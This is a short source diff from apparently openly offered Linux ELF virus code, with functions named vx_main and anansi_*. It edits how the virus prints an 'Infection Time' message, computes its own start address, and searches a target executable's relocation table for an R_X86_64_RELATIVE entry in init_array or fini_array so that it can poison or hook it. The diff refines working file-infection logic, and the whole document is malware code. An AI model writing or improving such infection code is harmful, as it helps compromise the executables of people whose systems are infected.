@@ -190,7 +190,7 @@ void vx_main()
 
 	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
 	char test_msg[] = "Infection Time\n";
-	anansi_write(1, test_msg, 15);
+	anansi_write(STDOUT_FILENO, test_msg, anansi_strlen(test_msg));
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
@@ -419,17 +419,20 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 
 	rela_count = rela_sz / rela_ent_size;
 	reloc_entry = (Elf64_Rela*)(target->read_only_mem + rela_offset);
+
 	char *random_section = get_random_int() % 2 ? init_array : fini_array;
 
-	for(int r = 0; r <= rela_count; r++) {
+#ifdef DEBUG
+	anansi_printf("Targeting %s section for R_X86_64_RELATIVE poisoning/hooking", random_section);
+#endif
+
+	target->desired_rela_offset = rela_offset;
+	for(int r = 0; r <= rela_count; r++, target->desired_rela_offset += rela_ent_size) {
 		if(reloc_entry[r].r_info == R_X86_64_RELATIVE) {
 			if(within_section(target, random_section, reloc_entry[r].r_offset)) {
 				desired_reloc->r_offset = reloc_entry[r].r_offset;
 				desired_reloc->r_info = reloc_entry[r].r_info;
 				desired_reloc->r_addend = reloc_entry[r].r_addend;
-
-				//take note where to find this offset for modification later.
-				target->desired_rela_offset = r * rela_sz;
 				return true;
 			}
 		}
